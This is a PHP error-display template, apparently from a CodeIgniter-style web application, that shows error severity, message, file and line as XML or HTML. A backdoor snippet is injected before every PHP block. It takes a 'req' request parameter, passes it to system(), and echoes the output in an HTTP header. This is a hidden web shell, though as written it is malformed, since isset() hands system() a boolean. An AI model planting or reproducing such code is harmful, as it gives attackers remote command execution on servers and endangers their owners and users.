<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (!defined("_CONTROLPANEL")) { ?>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n"; ?>
<response>
	<error>00</error>
	<error_text>System PHP Error (line <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $line; ?> of <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $filepath; ?>): <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo strip_tags($message); ?></error_text>
</response>
<? die(); ?>
<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } else { ?>

<div style="border:1px solid #990000;padding-left:20px;margin:0 0 10px 0;">

<h4>A PHP Error was encountered</h4>

<p>Severity: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $severity; ?></p>
<p>Message:  <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $message; ?></p>
<p>Filename: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $filepath; ?></p>
<p>Line Number: <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $line; ?></p>

</div>

<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); } ?>